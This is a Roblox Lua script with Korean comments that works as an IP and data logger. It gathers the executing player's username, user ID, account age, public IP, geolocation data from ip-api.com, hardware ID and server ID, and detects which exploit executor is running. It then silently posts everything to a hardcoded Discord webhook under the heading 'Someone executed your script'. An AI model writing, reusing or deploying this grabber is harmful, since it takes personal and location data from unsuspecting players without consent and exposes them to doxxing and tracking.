-- 서비스 로드
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalizationService = game:GetService("LocalizationService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")

-- 플레이어 정보 추출
local LocalPlayer = Players.LocalPlayer
local UserId = LocalPlayer.UserId
local DisplayName = LocalPlayer.DisplayName
local Username = LocalPlayer.Name
local MembershipType = tostring(LocalPlayer.MembershipType):sub(21) -- Enum.MembershipType. 접두사 제거
local AccountAge = LocalPlayer.AccountAge
local LocaleId = LocalizationService.RobloxLocaleId

-- 사용자 네트워크 및 기기 정보 수집
local PublicIP = game:HttpGet("https://v4.ident.me/")
local IPInfoJson = game:HttpGet("http://ip-api.com/json")
local HWID = RbxAnalyticsService:GetClientId()
-- 게임 정보 수집
local PlaceId = game.PlaceId
local JobId = game.JobId
local GameName = MarketplaceService:GetProductInfo(PlaceId).Name

-- 실행기(Executor) 감지 함수
local function GetExecutor()
    if not syn or (is_sirhurt_closure or pebc_execute) then
        if not secure_load then
            if not pebc_execute then
                if not KRNL_LOADED then
                    if not is_sirhurt_closure then
                        if identifyexecutor and identifyexecutor():find("ScriptWare") then
                            return "Script-Ware"
                        end
                        return "Unsupported"
                    end
                    return "SirHurt"
                end
                return "Krnl"
            end
            return "ProtoSmasher"
        end
        return "Sentinel"
    end
    return "Synapse X"
end

-- 디스코드 웹훅 전송 함수
local function SendWebhook(webhookUrl, jsonBody)
    local headers = {
        ["content-type"] = "application/json"
    }

    local httpRequest = http_request or request or HttpPost or (syn and syn.request)
    if httpRequest then
        httpRequest({
            Url = webhookUrl,
            Body = jsonBody,
            Method = "POST",
            Headers = headers
        })
    end
end

-- 디스코드 임베드(Embed) 페이로드 생성
local function CreatePayload()
    local executorName = GetExecutor()
    local currentDate = os.date("%m/%d/%Y")
    local currentTime = os.date("%X")

    local embed = {
        author = {
            name = "Someone executed your script",
            url = "https://roblox.com"
        },
        description = string.format(
            "Player Info\n" ..
            "Display Name: %s\n" ..
            "Username: %s\n" ..
            "User Id: %d\n" ..
            "MembershipType: %s\n" ..
            "AccountAge: %d\n" ..
            "Country: %s\n" ..
            "IP: %s\n" ..
            "Hwid: %s\n" ..
            "Date: %s\n" ..
            "Time: %s\n\n" ..
            "Game Info\n" ..
            "Game: %s\n" ..
            "Game Id: %d\n" ..
            "Exploit: %s\n\n" ..
            "Data: %s\n\n" ..
            "JobId: %s",
            DisplayName,
            Username,
            UserId,
            MembershipType,
            AccountAge,
            LocaleId,
            PublicIP,
            HWID,
            currentDate,
            currentTime,
            GameName,
            PlaceId,
            executorName,
            IPInfoJson,
            JobId or "nil"
        ),
        type = "rich",
        color = 0xFFD700, -- 금색
        thumbnail = {
            url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. UserId .. "&width=150&height=150&format=png"
        }
    }

    local payload = {
        avatar_url = "https://i.pinimg.com/564x/75/43/da/7543daab0a692385cca68245bf61e721.jpg",
        content = "",
        embeds = { embed }
    }
    return HttpService:JSONEncode(payload)
end

-- 웹훅 실행 (새로운 웹훅 URL 적용)
local webhookUrl = "https://discord.com/api/webhooks/1551210404041072722/lhTOTY5Z_Xn1Ry1H6Gmss8emn1zGIDXXpImLaxhqYd8wRfeJmTiTYJxSbq1k-Y97IPX2"
SendWebhook(webhookUrl, CreatePayload())
